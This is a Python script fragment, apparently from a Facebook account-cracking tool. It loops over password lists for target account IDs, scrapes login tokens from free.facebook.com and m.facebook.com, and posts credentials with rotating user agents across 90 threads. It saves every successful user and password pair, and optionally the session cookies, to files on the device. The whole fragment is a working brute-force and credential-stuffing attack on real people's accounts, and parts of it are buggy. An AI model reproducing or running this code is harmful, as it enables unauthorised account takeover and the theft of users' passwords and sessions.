 sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M3{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
 try:
  for ps in pw:
   session = requests.Session()
   pro = random.choice(ugen)
   free_fb = session.get(f'https://free.facebook.com').text
   log_data = {
    "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
   "try_number":"0",
   "unrecognized_tries":"0",
   "email":idf,
   "pass":ps,
   "login":"Log In"}
   header_freefb = {'authority':'web.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Google Chrome";v="106", "Not)A;Brand";v="99", "Chromium";v="106"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
   lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
   log_cookies=session.cookies.get_dict().keys()
   if 'c_user' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    user = re.findall('c_user=(.*);xs', coki)[0]
    print('\r\033[1;32m [KING-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki)
    ok+=1 
    open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
   elif 'checkpoint' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    coki1 = coki.split("1000")[1]
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
    open(' /sdcard/ULTRA-GREEN-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
  
 except:
  pass 
def m5(idf,pw):
 global loop
 global ok
 global agents
 animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
 sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M5{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
 try:
  for ps in pw:
   session = requests.Session()
            #animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
            #sys.stdout.write(f'\r     {K}[{H}{animasi}{P}/{A}%s{K}]{N}OK{B}>{H}%s'%(loop,len(ok))),
            #sys.stdout.flush()
   pro = random.choice(ugen)
   free_fb = session.get('https://m.facebook.com').text
   log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":idf,
            "pass":ps,
            "login":"Log In"}
   header_freefb = {
            'authority': 'm.facebook.com',
            'method': 'GET',
            'path': '/login/device-based/login/async/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://m.facebook.com',
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
   lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
   log_cookies=session.cookies.get_dict().keys()
   if 'c_user' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    user = re.findall('c_user=(.*);xs', coki)[0]
    print('\r\033[1;32m [KING-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki)
    ok+=1 
    open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
   elif 'checkpoint' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    coki1 = coki.split("1000")[1]
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
    open(' /sdcard/ULTRA-GREEN-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1

with ThreadPool(max_workers=90) as jjj:
    jjj.submit(sexy)
    jjj.submit(xxr)